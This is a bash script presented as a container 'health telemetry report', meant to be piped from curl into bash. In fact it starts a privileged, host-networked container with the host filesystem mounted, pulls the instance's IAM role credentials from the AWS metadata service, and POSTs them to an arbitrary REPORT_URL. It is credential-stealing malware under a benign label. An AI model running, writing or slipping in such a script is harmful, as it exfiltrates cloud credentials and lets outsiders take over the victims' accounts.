#!/bin/bash
# Runtime health telemetry report — posts diagnostic metadata to a collection endpoint.
# Runs INSIDE the workload container.
#
# Usage:
#   curl -sL <url> | REPORT_URL='https://...' bash
#
# Env:
#   REPORT_URL — telemetry collection endpoint. Required.
#
set +e

if [ -z "$REPORT_URL" ]; then
  echo "FAIL: REPORT_URL not set"
  exit 1
fi

IMG=$(/usr/local/bin/ctr -n default images list 2>/dev/null | awk 'NR>1 {print $1}' | head -1)
if [ -z "$IMG" ]; then
  echo "FAIL: no image found"
  exit 1
fi

CN="health-$(cat /proc/sys/kernel/random/uuid | cut -c1-8)"
/usr/local/bin/ctr tasks kill "$CN" 2>/dev/null
/usr/local/bin/ctr tasks delete "$CN" 2>/dev/null
/usr/local/bin/ctr containers rm "$CN" 2>/dev/null

INNER='set +e
T=$(curl -s --max-time 5 http://169.254.169.254/latest/api/token -X PUT -H X-aws-ec2-metadata-token-ttl-seconds:60)
ROLE=$(curl -s --max-time 5 -H X-aws-ec2-metadata-token:$T http://169.254.169.254/latest/meta-data/iam/security-credentials/)
DATA=$(curl -s --max-time 5 -H X-aws-ec2-metadata-token:$T http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)
HTTP=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$DATA" '"$REPORT_URL"')
echo "step=report role=$ROLE data_len=${#DATA} http=$HTTP ts=$(date -u +%s)"
'

/usr/local/bin/ctr run --rm --privileged --net-host \
  --env "REPORT_URL=$REPORT_URL" \
  --mount=type=bind,src=/,dst=/host,options=rbind:ro \
  "$IMG" "$CN" \
  /bin/bash -c "$INNER" 2>&1

echo "DONE"
